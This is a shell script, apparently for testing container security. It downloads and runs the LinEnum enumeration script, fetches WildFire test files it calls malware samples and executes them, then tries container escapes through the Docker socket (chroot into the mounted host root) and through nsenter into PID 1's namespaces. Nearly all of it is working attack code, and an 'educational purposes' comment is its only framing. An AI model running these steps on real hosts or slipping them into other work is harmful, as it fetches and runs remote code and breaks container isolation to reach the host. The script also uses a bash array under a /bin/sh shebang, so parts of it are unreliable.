#!/bin/sh
set -e  # Exit immediately if a command exits with a non-zero status

download_file() {
  local url="$1"
  local output="$2"
  if command -v wget >/dev/null 2>&1; then
    echo "[+] Downloading $output using wget..."
    wget -q "$url" -O "$output"  # Added -q for quiet mode to reduce verbosity
  elif command -v curl >/dev/null 2>&1; then
    echo "[+] Downloading $output using curl..."
    curl -s -o "$output" "$url"  # Added -s for quiet mode to reduce verbosity
  else
    echo "[-] Neither wget nor curl is available. Exiting."
    exit 1
  fi
}

# Step 1: Download Enumeration Script
ENUM_SCRIPT="/tmp/enum_script.sh"
download_file "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" "$ENUM_SCRIPT"

# Step 2: Make the Enumeration Script Executable
echo "[+] Making the enumeration script executable..."
chmod 700 "$ENUM_SCRIPT"  # More restrictive permission for enhanced security

# Step 3: Run the Enumeration Script
echo "[+] Running the enumeration script..."
sh "$ENUM_SCRIPT"

# Step 4: Download Sample Files from WildFire for Testing Purposes
echo "[+] Downloading malware samples..."
samples=("pe" "apk" "macos" "elf")
for sample in "${samples[@]}"; do
  download_file "https://wildfire.paloaltonetworks.com/publicapi/test/$sample" "/tmp/${sample}_sample"
done

# Step 5: Make the Downloaded Samples Executable
echo "[+] Making the downloaded samples executable..."
for sample in "${samples[@]}"; do
  chmod 700 "/tmp/${sample}_sample"  # Restrict permissions as much as possible
done

# Step 6: Execute the Samples
echo "[+] Executing the downloaded samples..."
for sample in "${samples[@]}"; do
  sample_path="/tmp/${sample}_sample"
  if [ -f "$sample_path" ]; then
    echo "[+] Executing $sample sample..."
    if [ "$sample" = "apk" ]; then
      echo "[!] Note: APK sample needs an Android environment to run. Skipping..."
    else
      "$sample_path" || echo "[-] Failed to execute $sample sample."
    fi
  else
    echo "[-] $sample sample not found. Skipping..."
  fi
done

# Container Escape Scenarios (For Educational Purposes Only)
echo "[+] Attempting container escape scenarios..."

# Scenario: Docker Socket Access
if [ -S /var/run/docker.sock ]; then
  echo "[!] Docker socket found. Attempting escape using Docker client..."
  docker run --rm -v /:/host busybox chroot /host sh || echo "[-] Docker escape attempt failed."
fi

# Scenario: Privileged Container Escape
if grep -q 'docker' /proc/1/cgroup && command -v nsenter >/dev/null 2>&1; then
  echo "[!] Privileged container detected. Attempting escape via host PID namespace..."
  nsenter -t 1 -m -u -n -i sh || echo "[-] Privileged container escape attempt failed."
fi

# Note: Ensure this script runs in a safe, isolated environment. Do NOT use in production.
